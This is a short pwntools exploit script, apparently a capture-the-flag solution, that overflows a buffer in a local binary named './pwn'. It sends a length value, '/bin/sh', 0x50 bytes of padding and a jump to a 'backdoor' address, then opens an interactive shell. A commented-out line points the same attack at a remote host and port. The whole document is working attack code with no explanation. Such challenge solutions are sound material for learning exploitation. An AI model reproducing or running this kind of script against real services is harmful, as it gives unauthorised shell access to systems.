from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'split', '-h'])
p=process('./pwn')
#p= remote('yuanshen.life', 32951)
elf = ELF('./pwn')

backdoor = 0x4011F4

p.recvuntil('length: ')
p.send( b'5376\n' + b'/bin/sh\x00' + b'a' * 0x50 + p64(backdoor))

p.interactive()